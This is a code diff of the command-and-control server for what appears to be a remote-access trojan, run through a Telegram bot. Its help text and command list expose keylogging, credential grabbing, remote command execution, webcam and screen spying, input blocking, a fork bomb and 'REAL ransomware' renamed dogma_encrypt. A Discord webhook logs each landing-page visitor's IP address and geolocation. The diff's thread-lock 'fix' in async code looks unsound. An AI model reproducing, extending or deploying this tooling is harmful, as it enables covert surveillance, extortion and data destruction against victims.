@@ -1,6 +1,8 @@
 # api/index.py
 # FINAL VERSION - Added input and process blocking commands.
 # ADDED - Replaced ransomware simulation with a fully functional version.
+# FIXED - Patched race condition in job posting with a threading lock.
+# FIXED - Synchronized commands with agent.py (dogma_encrypt, dogma_decrypt).
 
 import os
 import re
@@ -30,6 +32,9 @@ DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")
 app = Flask(__name__)
 ptb_app = Application.builder().token(TOKEN).build()
 
+# --- FIX: Add a lock to prevent race conditions when posting jobs ---
+job_lock = threading.Lock()
+
 # --- Helper Functions ---
 def esc(text):
     """Safely escapes text for Telegram MarkdownV2."""
@@ -52,20 +57,21 @@ async def set_state(target_id):
 
 async def post_job(target_id, command, args):
     job = {"job_id": str(uuid.uuid4()), "target_id": target_id, "command": command, "args": args}
-    async with httpx.AsyncClient() as client:
-        try:
+    with job_lock:  # --- FIX: Use the lock to make this operation atomic ---
+        async with httpx.AsyncClient() as client:
             try:
-                res = await client.get(JOBS_URL, timeout=5)
-                current_jobs = res.json() if res.status_code == 200 and isinstance(res.json(), list) else []
-            except Exception:
-                current_jobs = []
-            
-            current_jobs.append(job)
-            await client.post(JOBS_URL, json=current_jobs, timeout=5)
-            return True
-        except Exception as e:
-            print(f"Error posting job: {e}")
-            return False
+                try:
+                    res = await client.get(JOBS_URL, timeout=5)
+                    current_jobs = res.json() if res.status_code == 200 and isinstance(res.json(), list) else []
+                except Exception:
+                    current_jobs = []
+                
+                current_jobs.append(job)
+                await client.post(JOBS_URL, json=current_jobs, timeout=5)
+                return True
+            except Exception as e:
+                print(f"Error posting job: {e}")
+                return False
 
 # --- Telegram Command Handlers ---
 async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -109,8 +115,8 @@ async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "*💣 DESTRUCTIVE & ADVANCED*\n"
         "`/forkbomb` \\- ⚠️ Rapidly spawns processes\n"
         "`/cancelforkbomb` \\- Stop the fork bomb\n"
-        "`/ransomware` \\- ☢️ *DANGEROUS*\\. Deploys REAL ransomware\\. *IRREVERSIBLE WITHOUT KEY*\\.\n"
-        "`/restore <key>` \\- Restores files using the provided key\n"
+        "`/dogma_encrypt` \\- ☢️ *DANGEROUS*\\. Deploys REAL ransomware\\. *IRREVERSIBLE WITHOUT KEY*\\.\n"
+        "`/dogma_decrypt <key>` \\- Restores files using the provided key\n"
         "`/destroy <id> CONFIRM` \\- Uninstall and remove the agent\n"
     )
     await update.message.reply_text(help_text, parse_mode='MarkdownV2')
@@ -190,12 +196,14 @@ ptb_app.add_handler(CommandHandler("help", cmd_help))
 ptb_app.add_handler(CommandHandler("list", cmd_list))
 ptb_app.add_handler(CommandHandler("target", cmd_target))
 ptb_app.add_handler(CommandHandler("destroy", cmd_destroy))
+
+# --- FIX: Synchronized command list with agent.py ---
 agent_commands = [
     "info", "startkeylogger", "stopkeylogger", "grab", "exec", "ss", "cam", 
     "livestream", "stoplivestream", "livecam", "stoplivecam", "ls", "cd", 
     "pwd", "download", "blockkeyboard", "unblockkeyboard", "blockmouse", 
     "unblockmouse", "startblocker", "stopblocker",
-    "forkbomb", "cancelforkbomb", "ransomware", "restore"
+    "forkbomb", "cancelforkbomb", "dogma_encrypt", "dogma_decrypt"
 ]
 for cmd in agent_commands:
     ptb_app.add_handler(CommandHandler(cmd, generic_command_handler))
@@ -219,20 +227,22 @@ def log_to_discord(ip, user_agent):
     if not DISCORD_WEBHOOK_URL: return
     geo_info = {}
     try:
-        import requests
-        geo_res = requests.get(f"http://ip-api.com/json/{ip}", timeout=3)
-        if geo_res.status_code == 200:
-            geo_data = geo_res.json()
-            geo_info['Country'] = f":flag_{geo_data.get('countryCode', '').lower()}: {geo_data.get('country', 'N/A')}"
-            geo_info['City'] = geo_data.get('city', 'N/A')
-            geo_info['ISP'] = geo_data.get('isp', 'N/A')
+        # Use httpx for consistency, although requests is also fine here
+        with httpx.Client() as client:
+            geo_res = client.get(f"http://ip-api.com/json/{ip}", timeout=3)
+            if geo_res.status_code == 200:
+                geo_data = geo_res.json()
+                geo_info['Country'] = f":flag_{geo_data.get('countryCode', '').lower()}: {geo_data.get('country', 'N/A')}"
+                geo_info['City'] = geo_data.get('city', 'N/A')
+                geo_info['ISP'] = geo_data.get('isp', 'N/A')
     except Exception:
         geo_info['Error'] = 'Geolocation lookup failed'
 
     embed = { "title": "👁️ Vercel Site Visitor", "color": 3447003, "description": f"A new visitor has accessed the landing page.", "fields": [{"name": "🌐 IP Address", "value": f"`{ip}`", "inline": True}, {"name": "🌍 Country", "value": geo_info.get('Country', 'N/A'), "inline": True}, {"name": "🏙️ City", "value": geo_info.get('City', 'N/A'), "inline": True}, {"name": "🏢 ISP", "value": geo_info.get('ISP', 'N/A'), "inline": False}, {"name": "🖥️ User Agent", "value": f"```{user_agent}```"}], "footer": {"text": f"Timestamp: {time.ctime()}"} }
     data = {"embeds": [embed]}
     try:
-        requests.post(DISCORD_WEBHOOK_URL, json=data, timeout=5)
+        with httpx.Client() as client:
+            client.post(DISCORD_WEBHOOK_URL, json=data, timeout=5)
     except Exception as e:
         print(f"Failed to log to Discord: {e}")
 
